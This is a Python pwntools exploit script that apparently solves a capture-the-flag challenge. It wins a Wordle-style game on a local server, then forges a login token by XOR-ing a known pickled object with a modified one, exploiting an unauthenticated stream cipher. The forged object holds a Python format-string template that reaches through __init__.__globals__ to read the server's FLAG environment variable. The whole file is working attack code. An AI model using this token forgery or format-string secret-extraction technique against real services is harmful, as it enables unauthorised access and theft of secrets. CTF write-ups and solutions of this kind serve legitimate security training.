from pwn import *
from base64 import b64encode, b64decode
from random import choice

with open("five_letter_words.txt") as f:
    words = list(map(str.strip, f))

encoded_words = [b64encode(w.encode()).decode() for w in words]


def get_diff(io, inp: str):
    io.sendlineafter(b"> ", inp.encode())
    return io.recvlineS().strip()


def check_cand(c, inp, diff):
    for i, r in enumerate(diff):
        if r == "X":
            if inp[i] in c:
                return False
        if r == "O":
            if c[i] != inp[i]:
                return False
        if r == "-":
            if inp[i] not in c:
                return False
    return True


def win_a_round(io):
    candidates = encoded_words
    for i in range(6):
        inp = choice(candidates)
        diff = get_diff(io, inp)
        if "win" in diff:
            print(f"win at {i} round")
            return b64decode(inp).decode()
        candidates = [c for c in candidates if check_cand(c, inp, diff)]
    print("So unlucky...")
    exit(1)


class Player:
    def __init__(self, name, wins=0, words=[]):
        self.name = name
        self.wins = wins
        self.words = words
        self.profile_tmpl = "=== Player {user.name} ===\nWins: {user.wins}\nGuessed words: {user.words}\n"

    def __repr__(self):
        return self.profile_tmpl.format(user=self)

    def __reduce__(self):
        return (
            Player,
            (
                self.name,
                self.wins,
                self.words,
            ),
        )


def token_decode(b):
    tmp = b64decode(b)
    ct, nonce = tmp[8:], tmp[:8]
    return ct, nonce


def xor(x, y):
    return bytes([a ^ b for a, b in zip(x, y)])


# io = process(["python", "server.py"], env={"FLAG": "test_flag"})
io = remote("localhost", 6000)
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"name? ", b"peko" * 32)
player = Player("peko" * 32)

io.sendlineafter(b"> ", b"2")
player.words.append(win_a_round(io))
player.wins += 1
io.sendlineafter(b"> ", b"3")
io.recvuntil(b"Login token: ")
c1, n1 = token_decode(io.recvline().strip())
p1 = pickle.dumps(player)

io.sendlineafter(b"> ", b"4")  # logout

del Player.__reduce__
player.name = "peko"
player.profile_tmpl = (
    "{user.__init__.__globals__[pickle].sys.modules[os].environ[FLAG]}"
)
target_ct = xor(xor(c1, p1), pickle.dumps(player))

tok = b64encode(n1 + target_ct)
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Login token: ", tok)
io.sendlineafter(b"> ", b"1")
io.interactive()
